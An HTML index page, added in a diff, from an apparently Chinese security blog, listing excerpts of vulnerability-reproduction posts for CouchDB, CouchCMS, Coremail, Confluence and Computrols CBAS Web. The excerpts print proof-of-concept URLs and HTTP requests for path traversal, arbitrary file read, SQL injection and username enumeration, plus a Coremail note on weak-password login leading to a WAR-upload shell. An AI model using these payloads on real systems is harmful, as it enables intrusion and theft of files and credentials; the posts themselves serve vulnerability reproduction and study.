@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/87/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-CouchDB/（CVE-2017-12635）Couchdb 垂直权限绕过漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/CouchDB/%EF%BC%88CVE-2017-12635%EF%BC%89Couchdb%20%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.373Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-12635）Couchdb-垂直权限绕过漏洞"><a href="#（CVE-2017-12635）Couchdb-垂直权限绕过漏洞" class="headerlink" title="（CVE-2017-12635）Couchdb 垂直权限绕过漏洞"></a>（CVE-2017-12635）Couchdb 垂直权限绕过漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>小于 1.7.0 以及 小于 2.1.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre><code>docker-compose build
+docker-compose up -d
+</code></pre>
+<p>环境启动后，访问<code>http://www.0-sec.org:5984/_utils/</code>即可看到一个web页面，说明Couchdb已成功启动。但我们不知道密码，无法登陆。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/CouchDB/%EF%BC%88CVE-2017-12635%EF%BC%89Couchdb%20%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/CouchDB/%EF%BC%88CVE-2017-12635%EF%BC%89Couchdb%20%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnlb004ay8v1deqx03fo" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Couchcms/（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Couchcms/%EF%BC%88CVE-2018-7662%EF%BC%89Couchcms%202.0%20%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.367Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-7662）Couchcms-2-0-存在路径泄露漏洞"><a href="#（CVE-2018-7662）Couchcms-2-0-存在路径泄露漏洞" class="headerlink" title="（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞"></a>（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Couch through<br>2.0存在路径泄露漏洞，当访问特定url时系统返回的报错信息中暴露物理路径信息。Couch<br>through是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过<a target="_blank" rel="noopener" href="https://github.com/CouchCMS/CouchCMS/issues/46">issues</a>告知作者。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Couch through 2.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>访问如下页面，报错信息中显示完整物理路径信息。</p>
+<pre><code>http://www.0-sec.org/includes/mysql2i/mysql2i.func.php
+http://www.0-sec.org/addons/phpmailer/phpmailer.php
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Couchcms/%EF%BC%88CVE-2018-7662%EF%BC%89Couchcms%202.0%20%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Couchcms/%EF%BC%88CVE-2018-7662%EF%BC%89Couchcms%202.0%20%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnia0044y8v14k6m3km4" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Coremail/Coremail配置文件信息泄漏" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Coremail/Coremail%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.335Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Coremail配置文件信息泄漏"><a href="#Coremail配置文件信息泄漏" class="headerlink" title="Coremail配置文件信息泄漏"></a>Coremail配置文件信息泄漏</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Coremail论客邮件系统开始研发于1999年，是中国第一套中文邮件系统，目前在中国大陆地区拥有超过10亿终端用户，是网易、中华网等运营商至今一直使用的邮件系统，也是政府、事业单位、科教、企业等机构广泛使用的邮件系统。</p>
+<p>2019年6月，网上流传出Coremail论客邮件系统配置文件泄露的漏洞，该漏洞无需认证即可获取邮件系统的配置文件内容。</p>
+<p>Coremail官网发布的漏洞公告：《关于Coremail邮件系统安全问题的情况说明》，<a target="_blank" rel="noopener" href="http://www.coremail.cn/About/news/_x/article/_id/32641.htm">http://www.coremail.cn/About/news\_x/article\_id/32641.htm</a></p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Coremail XT 3.0.1至XT 5.0.9版本，XT 5.0.9a及以上版本已修复该漏洞</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code>http://mail.0-sec.org/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Coremail/Coremail%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Coremail/Coremail%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" data-id="cl5c2qnn5004dy8v1fdmthyxz" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Coremail/Coremail邮箱系统 目录穿越泄漏后台漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Coremail/Coremail%E9%82%AE%E7%AE%B1%E7%B3%BB%E7%BB%9F%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%B3%84%E6%BC%8F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.332Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Coremail邮箱系统-目录穿越泄漏后台漏洞"><a href="#Coremail邮箱系统-目录穿越泄漏后台漏洞" class="headerlink" title="Coremail邮箱系统 目录穿越泄漏后台漏洞"></a>Coremail邮箱系统 目录穿越泄漏后台漏洞</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>![](/resource/Coremail邮箱系统目录穿越泄漏后台漏洞/media/1.png)</p>
+<p><code>POC:url+/lunkr/cache/;/;/../../manager.html</code></p>
+<p>![](/resource/Coremail邮箱系统目录穿越泄漏后台漏洞/media/2.png)</p>
+<p>访问过去会直接跳转到tomcat控制台，这里你就可以采用coremail/coremail弱口令尝试登陆，或者暴力破解。然后就是部署war包Getshell就ok了。</p>
+<p>修复建议：对外隐藏tomcat控制台，修改默认口令。</p>
+<p>![](/resource/Coremail邮箱系统目录穿越泄漏后台漏洞/media/3.png)</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Coremail/Coremail%E9%82%AE%E7%AE%B1%E7%B3%BB%E7%BB%9F%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%B3%84%E6%BC%8F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Coremail/Coremail%E9%82%AE%E7%AE%B1%E7%B3%BB%E7%BB%9F%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%B3%84%E6%BC%8F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnn4004cy8v1gvee5rhl" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Confluence/（CVE-2019-3398）Confluence 路径穿越漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Confluence/%EF%BC%88CVE-2019-3398%EF%BC%89Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.283Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-3398）Confluence-路径穿越漏洞"><a href="#（CVE-2019-3398）Confluence-路径穿越漏洞" class="headerlink" title="（CVE-2019-3398）Confluence 路径穿越漏洞"></a>（CVE-2019-3398）Confluence 路径穿越漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2.0.0 &lt;= version &lt; 6.6.136.7.0 &lt;= version &lt; 6.12.46.13.0 &lt;= version &lt; 6.13.46.14.0 &lt;= version &lt; 6.14.36.15.0 &lt;= version &lt; 6.15.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先根据官方描述，<code>downloadallattachments</code>这个资源，结合其验证缓解措施的方式，找到了漏洞触发点：</p>
+<pre><code>... =》附件=》下载全部
+</code></pre>
+<p>点击<code>下载全部</code>时，会触发一个GET请求：</p>
+<pre><code>GET /pages/downloadallattachments.action?pageId=65601
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Confluence/%EF%BC%88CVE-2019-3398%EF%BC%89Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Confluence/%EF%BC%88CVE-2019-3398%EF%BC%89Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnkk0049y8v1hud33ur7" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Confluence/（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Confluence/%EF%BC%88CVE-2019-3396%EF%BC%89Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.279Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-3396）Confluence-路径穿越与命令执行漏洞"><a href="#（CVE-2019-3396）Confluence-路径穿越与命令执行漏洞" class="headerlink" title="（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞"></a>（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Atlassian<br>Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><pre><code>Confluence 1.*.*、2.*.*、3.*.*、4.*.*、5.*.*
+
+Confluence 6.0.*、6.1.*、6.2.*、6.3.*、6.4.*、6.5.*
+
+Confluence 6.6.* &lt; 6.6.12
+
+Confluence6.7.*、6.8.*、6.9.*、6.10.*、6.11.*
+
+Confluence 6.12.* &lt; 6.12.3
+
+Confluence 6.13.* &lt; 6.13.3
+
+Confluence 6.14.* &lt; 6.14.2
+</code></pre>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>发送如下数据包，即可读取文件<code>web.xml</code>：</p>
+<pre><code>POST /rest/tinymce/1/macro/preview HTTP/1.1
+Host: localhost:8090
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Referer: http://localhost:8090/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;
+Content-Type: application/json; charset=utf-8
+Content-Length: 176
+
+&#123;&quot;contentId&quot;:&quot;786458&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/23464dc6&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;../web.xml&quot;&#125;&#125;&#125;
+</code></pre>
+<p><img src="/resource/(CVE-2019-3396)Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>6.12以前的Confluence没有限制文件读取的协议和路径，我们可以使用<code>file:///etc/passwd</code>来读取文件，也可以通过<code>https://...</code>来加载远程文件。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Confluence/%EF%BC%88CVE-2019-3396%EF%BC%89Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Confluence/%EF%BC%88CVE-2019-3396%EF%BC%89Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnkk0048y8v176aja9ya" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Confluence/（CVE-2019-3394）Confluence 文件读取漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Confluence/%EF%BC%88CVE-2019-3394%EF%BC%89Confluence%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.277Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-3394）Confluence-文件读取漏洞"><a href="#（CVE-2019-3394）Confluence-文件读取漏洞" class="headerlink" title="（CVE-2019-3394）Confluence 文件读取漏洞"></a>（CVE-2019-3394）Confluence 文件读取漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
+<p>（CVE-2019-3394）Confluence 文件读取漏洞</p>
+</blockquote>
+<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><ul>
+<li><p>  6.1.0 &lt;= version &lt; 6.6.16</p>
+</li>
+<li><p>  6.7.0 &lt;= version &lt; 6.13.7</p>
+</li>
+<li><p>  6.14.0 &lt;= version &lt; 6.15.8</p>
+</li>
+</ul>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><pre><code>POST /rest/tinymce/1/macro/preview  HTTP/1.1
+Host: localhost:8090
+Content-Length: 175
+Accept: text/plain, */*; q=0.01 
+Origin: http://localhost:8090
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 
+Content-Type: application/json; charset=UTF-8
+Referer: http://localhost:8090/ 
+Connection: close
+
+&#123;&quot;contentId&quot;:&quot;1&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;: &#123;&quot;url&quot;:&quot;https://www.viddler.com/v/test&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_templat e&quot;:&quot;file:///C:/Windows/win.ini&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125;
+</code></pre>
+<h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><ol>
+<li><p> 一个有效的登录账号</p>
+</li>
+<li><p> 该账号具有在空间「添加页面」的权限</p>
+</li>
+</ol>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Confluence/%EF%BC%88CVE-2019-3394%EF%BC%89Confluence%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Confluence/%EF%BC%88CVE-2019-3394%EF%BC%89Confluence%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnkj0047y8v16haf6fh3" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Computrols CBAS Web/（CVE-2019-10852）Computrols CBAS Web SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Computrols%20CBAS%20Web/%EF%BC%88CVE-2019-10852%EF%BC%89Computrols%20CBAS%20Web%20SQL%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.272Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-10852）Computrols-CBAS-Web-SQL注入"><a href="#（CVE-2019-10852）Computrols-CBAS-Web-SQL注入" class="headerlink" title="（CVE-2019-10852）Computrols CBAS Web SQL注入"></a>（CVE-2019-10852）Computrols CBAS Web SQL注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Computrols CBAS-Web经过身份验证的基于布尔的盲SQL注入</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>19.0.0及以下</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://www.0-sec.org/cbas/index.php?m=servers&amp;a=start_pulling&amp;id=1 AND 2510 = 2510
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Computrols%20CBAS%20Web/%EF%BC%88CVE-2019-10852%EF%BC%89Computrols%20CBAS%20Web%20SQL%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Computrols%20CBAS%20Web/%EF%BC%88CVE-2019-10852%EF%BC%89Computrols%20CBAS%20Web%20SQL%E6%B3%A8%E5%85%A5/" data-id="cl5c2qndz003xy8v16fxt3jw1" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Computrols CBAS Web/（CVE-2019-10848）Computrols CBAS Web 用户名枚举" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Computrols%20CBAS%20Web/%EF%BC%88CVE-2019-10848%EF%BC%89Computrols%20CBAS%20Web%20%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.269Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-10848）Computrols-CBAS-Web-用户名枚举"><a href="#（CVE-2019-10848）Computrols-CBAS-Web-用户名枚举" class="headerlink" title="（CVE-2019-10848）Computrols CBAS Web 用户名枚举"></a>（CVE-2019-10848）Computrols CBAS Web 用户名枚举</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>19.0.0及以下</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="测试无效用户："><a href="#测试无效用户：" class="headerlink" title="测试无效用户："></a>测试无效用户：</h3><pre><code>POST /cbas/index.php?m=auth&amp;a=login HTTP/1.1
+
+username=randomuser&amp;password=&amp;challenge=60753c1b5e449de80e21472b5911594d&amp;response=e16371917371b8b70529737813840c62
+</code></pre>
+<p>Response</p>
+<pre><code>&lt;!-- Failed login comments appear here --&gt;
+&lt;p class=&quot;alert-error&quot;&gt;randomuser&lt;/p&gt;
+</code></pre>
+<h3 id="测试有效用户："><a href="#测试有效用户：" class="headerlink" title="测试有效用户："></a>测试有效用户：</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Computrols%20CBAS%20Web/%EF%BC%88CVE-2019-10848%EF%BC%89Computrols%20CBAS%20Web%20%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Computrols%20CBAS%20Web/%EF%BC%88CVE-2019-10848%EF%BC%89Computrols%20CBAS%20Web%20%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE/" data-id="cl5c2qndy003wy8v18s772p7y" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Computrols CBAS Web/（CVE-2019-10846）Computrols CBAS Web反射型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Computrols%20CBAS%20Web/%EF%BC%88CVE-2019-10846%EF%BC%89Computrols%20CBAS%20Web%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.267Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-10846）Computrols-CBAS-Web反射型xss"><a href="#（CVE-2019-10846）Computrols-CBAS-Web反射型xss" class="headerlink" title="（CVE-2019-10846）Computrols CBAS Web反射型xss"></a>（CVE-2019-10846）Computrols CBAS Web反射型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Computrols CBAS Web是美国Computrols公司的一套楼宇自动化系统</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Computrols CBAS Web&lt;=19.0.0</p>
